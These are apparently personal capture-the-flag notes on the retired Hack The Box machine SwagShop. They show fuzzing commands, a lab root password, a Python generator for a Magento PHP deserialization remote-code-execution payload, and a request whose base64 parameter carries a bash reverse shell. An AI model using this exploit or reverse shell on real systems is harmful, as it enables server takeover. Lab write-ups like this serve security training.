# Discovery

## NMAP
![[Pasted image 20240521182554.png]]
## FFUF

``` bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -u http://swagshop.htb/FUZZ -c -fs 277
```
![[Pasted image 20240521182340.png]]
``` bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -u http://swagshop.htb/app/FUZZ -c -fs 277
```
![[Pasted image 20240521183012.png]]



## Content
root:fMVWh7bDHpgZkyfqQXreTjU9


http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/7821d5d3e55380dcc880ab4c61c93915/block/tab_orders/period/7d/?isAjax=true
T7Kjh576X7cNa2i0
# Exploit
```py
import requests
import base64

from hashlib import md5





def create_payload(arg):
    php_function ='system'
    date = 'Wed, 08 May 2019 07:23:09 +0000'


    payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,len(arg), arg)
    payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    gh = md5((payload + date).encode('utf-8')).hexdigest()

    print(payload+ '&h='+gh)


arg = input("CMD: ") 
while arg != 'q':
    create_payload(arg)

    arg = input("CMD: ")



```


GET /index.php/admin/dashboard/tunnel/key/38b8305c1105cf76eb8515fccbf2646a/?ga=Tzo4OiJaZW5kX0xvZyI6MTp7czoxMToiACoAX3dyaXRlcnMiO2E6Mjp7aTowO086MjA6IlplbmRfTG9nX1dyaXRlcl9NYWlsIjo0OntzOjE2OiIAKgBfZXZlbnRzVG9NYWlsIjthOjM6e2k6MDtzOjExOiJFWFRFUk1JTkFURSI7aToxO3M6MTI6IkVYVEVSTUlOQVRFISI7aToyO3M6MTU6IkVYVEVSTUlOQVRFISEhISI7fXM6MjI6IgAqAF9zdWJqZWN0UHJlcGVuZFRleHQiO047czoxMDoiACoAX2xheW91dCI7TzoyMzoiWmVuZF9Db25maWdfV3JpdGVyX1lhbWwiOjM6e3M6MTU6IgAqAF95YW1sRW5jb2RlciI7czo2OiJzeXN0ZW0iO3M6MTc6IgAqAF9sb2FkZWRTZWN0aW9uIjtOO3M6MTA6IgAqAF9jb25maWciO086MTM6IlZhcmllbl9PYmplY3QiOjE6e3M6ODoiACoAX2RhdGEiO3M6NTE6ImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjEvOTAwMSAwPiYxJyI7fX1zOjg6IgAqAF9tYWlsIjtPOjk6IlplbmRfTWFpbCI6MDp7fX1pOjE7aToyO319&h=28ed982aeff876180c8dc55598f0a908 HTTP/1.1
Host: swagshop.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Cookie: adminhtml=m5h37t2sr8ss3n5s2gv6cq8vo4

[[retired]]
[[HTB machines]]
